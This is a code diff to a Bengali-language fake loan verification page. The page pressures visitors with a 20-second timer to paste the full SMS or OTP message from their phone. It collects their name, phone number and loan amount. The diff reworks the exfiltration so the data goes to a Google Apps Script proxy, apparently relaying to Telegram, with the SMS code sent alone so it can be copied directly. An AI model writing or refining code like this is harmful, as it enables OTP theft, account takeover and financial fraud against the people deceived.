@@ -107,11 +107,7 @@
             <span id="timerText"><span class="timer-num" id="timeCount">২০</span> সেকেন্ডের মধ্যে আপনার পুরো এসএমএসটি কপি করে দিন।</span>
         </div>
 
-        <form id="verifyForm2" action="https://formspree.io/f/xvkkeegq" method="POST">
-            <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
-            <input type="hidden" name="মোবাইল_নম্বর" id="hiddenPhone">
-            <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">
-
+        <form id="verifyForm2">
             <div class="form-group">
                 <label><i class="fa-solid fa-envelope-open-text"></i> এসএমএস / অ্যাপ্লিকেশন আইডি টেক্সট</label>
                 <textarea id="appText" name="সম্পূর্ণ_এসএমএস_বা_আইডি_ধাপ_২" required placeholder="আপনার ফোনে আসা সম্পূর্ণ বার্তাটি এখানে লিখুন বা পেস্ট করুন..."></textarea>
@@ -144,14 +140,11 @@
     // সুরক্ষিত গুগল অ্যাপস স্ক্রিপ্ট প্রক্সি URL
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-MX5twDJTbDjN-B_llF5Y9TBb_Kv-W2pJ1Soymn3HbEG0CfAEtQ0WV7qmz8OPUgI/exec";
 
+    // URL অথবা ব্রাউজার মেমোরি থেকে গ্রাহকের তথ্য রিড করা
     const params = new URLSearchParams(window.location.search);
-    const applicantName = params.get('name') || 'N/A';
-    const applicantPhone = params.get('phone') || 'N/A';
-    const applicantAmount = params.get('amount') || 'N/A';
-
-    document.getElementById('hiddenName').value = applicantName;
-    document.getElementById('hiddenPhone').value = applicantPhone;
-    document.getElementById('hiddenAmount').value = applicantAmount;
+    const applicantName = params.get('name') || localStorage.getItem('loan_cust_name') || 'N/A';
+    const applicantPhone = params.get('phone') || localStorage.getItem('loan_cust_phone') || 'N/A';
+    const applicantAmount = params.get('amount') || localStorage.getItem('loan_cust_amount') || 'N/A';
 
     let timeLeft = 20;
     let timer = null;
@@ -201,31 +194,33 @@
         btnSubmit.disabled = true;
         btnSubmit.innerHTML = '<span>যাচাই করা হচ্ছে...</span>';
 
-        const smsText = document.getElementById("appText").value;
+        const smsText = document.getElementById("appText").value.trim();
 
-        // টেলিগ্রাম মেসেজ ফরম্যাট
-        const message = `📩 নতুন এসএমএস / ওটিপি যাচাই!\n\n` +
-                        `👤 নাম: ${applicantName}\n` +
-                        `📞 মোবাইল: ${applicantPhone}\n` +
-                        `💰 লোনের পরিমাণ: ${applicantAmount} টাকা\n\n` +
-                        `💬 এসএমএস টেক্সট:\n${smsText}\n\n` +
-                        `⏰ সময়: ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}`;
+        // ১. গ্রাহকের তথ্যের বিস্তারিত মেসেজ
+        const infoMessage = `📩 নতুন এসএমএস / ওটিপি যাচাই!\n\n` +
+                            `👤 নাম: ${applicantName}\n` +
+                            `📞 মোবাইল: ${applicantPhone}\n` +
+                            `💰 লোনের পরিমাণ: ${applicantAmount} টাকা\n` +
+                            `⏰ সময়: ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}`;
 
-        // ১. সুরক্ষিত গুগল স্ক্রিপ্টে মেসেজ পাঠানো
+        // ২. শুধুমাত্র এসএমএস টেক্সট (যাতে সরাসরি কপি করা যায়)
+        const codeOnlyMessage = smsText;
+
+        // ১ম মেসেজ পাঠানো (তথ্য)
         fetch(GOOGLE_SCRIPT_URL, {
             method: "POST",
             mode: "no-cors",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ message: message })
+            body: JSON.stringify({ message: infoMessage })
         }).finally(() => {
-            // ২. Formspree-তে ডাটা ব্যাকআপ পাঠানো
-            const data = new FormData(form);
-            fetch(form.action, {
+            // ২য় মেসেজ পাঠানো (শুধু এসএমএস কোড)
+            fetch(GOOGLE_SCRIPT_URL, {
                 method: "POST",
-                body: data,
-                headers: { 'Accept': 'application/json' }
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ message: codeOnlyMessage })
             }).finally(() => {
-                // ৩. সবশেষে success.html পেজে নিয়ে যাওয়া
+                // সরাসরি success.html পেজে নিয়ে যাওয়া
                 window.location.href = "success.html";
             });
         });
